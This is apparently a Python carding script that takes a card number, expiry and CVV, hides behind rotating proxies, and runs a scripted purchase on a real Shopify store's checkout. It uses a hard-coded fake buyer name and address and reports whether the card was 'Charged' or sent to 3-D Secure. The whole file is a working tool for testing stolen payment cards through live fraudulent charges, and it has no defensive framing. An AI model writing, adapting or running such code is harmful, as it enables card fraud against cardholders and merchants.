from all.configs._def_main_ import *

@retry(stop=stop_after_attempt(3))
async def auto_sho_async(cc, mes, ano, cvv):

    proxy_url = random.choice(proxies)
    print(proxy_url)

    conn = aiohttp_proxy.ProxyConnector.from_url(proxy_url)

    async with aiohttp.ClientSession(connector=conn) as session:

        print(Fore.CYAN +
              f"[ + ] INICIANDO PROCESO" + Fore.RESET)

        payload_1 = {
            'id': '28927317185'
        }

        req1 = await session.post(url=f"https://shopnicekicks.com/cart/add.js", data=payload_1, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        req3 = await session.get(url=f"https://shopnicekicks.com/checkout", ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        checkout_url = req3.url

        print(Fore.CYAN +
              f"[ + ] URL CHECKOUT: {checkout_url}" + Fore.RESET)

        authenticity_token = get_random_string(86)

        headers = {

            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

        }

        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=jorgeantonio%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=robert&checkout%5Bshipping_address%5D%5Blast_name%5D=garcia&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=32+Allen+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10002&checkout%5Bshipping_address%5D%5Bphone%5D=%28251%29+678-1923&checkout%5Battributes%5D%5BI-agree-to-the-Terms-and-Conditions%5D=Yes&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        
        req4 = await session.post(url=checkout_url, headers=headers, data=payload_2, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=PI+Bespoke+Shipping-Flat%2520Rate-6.95&checkout%5Battributes%5D%5BI-agree-to-the-Terms-and-Conditions%5D=Yes&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        
        req5 = await session.post(url=checkout_url, headers=headers, data=payload_3, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        payload_4 = {
            "credit_card": {
                "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Sylphiette Idk",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": "hopnicekicks.com"
        }

        req6 = await session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        token = await req6.json()

        id_ = token.get('id')

        print(Fore.CYAN +
              f"[ + ] TOKEN ID: {id_}" + Fore.RESET)

        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=3746873&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B12516781923&checkout%5Btotal_price%5D=1293&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        
        req7 = await session.post(url=checkout_url, headers=headers, data=payload_5, ssl=False, timeout=aiohttp.ClientTimeout(total=8))

        await asyncio.sleep(5)

        processing_url = req7.url

        print(Fore.CYAN +
              f"[ + ] URL PROCESADA: {processing_url}" + Fore.RESET)

        req8 = await session.get(str(processing_url) + '?from_processing_page=1', ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        await asyncio.sleep(5)

        req9 = await session.get(req8.url, ssl=False, timeout=aiohttp.ClientTimeout(total=5))

        text_resp = await req9.text()

        resp = find_between(text_resp, 'notice__text">', '<')

        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):

            resp = 'Charged'

        elif '/3d_secure_2/' in str(req9.url):

            resp = '3d_secure_2'

        return resp